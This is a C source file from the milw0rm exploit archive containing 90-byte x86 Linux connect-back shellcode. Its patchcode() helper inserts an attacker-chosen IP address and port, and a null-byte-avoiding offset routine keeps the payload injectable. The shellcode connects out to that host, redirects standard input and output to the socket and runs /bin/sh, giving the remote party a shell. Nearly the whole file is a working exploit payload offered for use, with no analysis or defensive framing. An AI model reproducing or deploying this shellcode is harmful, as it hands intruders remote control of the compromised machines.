/*---------------------------------------------------------------------------*
 *                 90 byte Connect Back shellcode                            *
 *              by Russell Sanford - xort@tty64.org                          *
 *---------------------------------------------------------------------------*
 *    filename: x86-linux-connect-back.c                                     *
 *        info: Compiled with DTP Project.                                   *
 * discription: This is a x86-linux connect back shellcode. Just invoke      *
 * 		the function patchcode() before using shellcode. The format  *
 * 		for invoking patchcode is as follows:                        *
 *                                                                           *
 * 		patchcode(shellcode,"11.22.33.44",31337);                    *
 *---------------------------------------------------------------------------*/

char shellcode[] =
"\x31\xc0\x6a\x01\x5b\x50\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x43\x5f\x68"
" xor\x81\x04\x24t@tt\x68y64.\x81\x04\x24org \x6a\x10\x51\x50\x89\xe1\xb0\x66"
"\xcd\x80\x5b\x31\xc9\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x31\xc0\x50"
"\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b"
"\xcd\x80\xeb\xfe";

int find_safe_offset(int INT_A) {

	int INT_B=0;

	do {
		INT_A -= 0x01010101;	INT_B += 0x01010101;
	}
	while ( ((INT_A & 0x000000ff) == 0) ||
		((INT_A & 0x0000ff00) == 0) ||
		((INT_A & 0x00ff0000) == 0) ||
		((INT_A & 0xff000000) == 0) );

	return INT_B;
}

void patchcode(char *shellcode, char *IP, int PORT) {

	int IP_A = inet_addr(IP);
	int IP_B = find_safe_offset(IP_A);

	int PORT_A = ((ntohs(PORT) << 16) + 2);
	int PORT_B = find_safe_offset(PORT_A);

	*(int *)&shellcode[19] = (IP_A - IP_B);
	*(int *)&shellcode[26] = IP_B;

	*(int *)&shellcode[31] = (PORT_A - PORT_B);
	*(int *)&shellcode[38] = PORT_B;
}

// milw0rm.com [2005-12-28]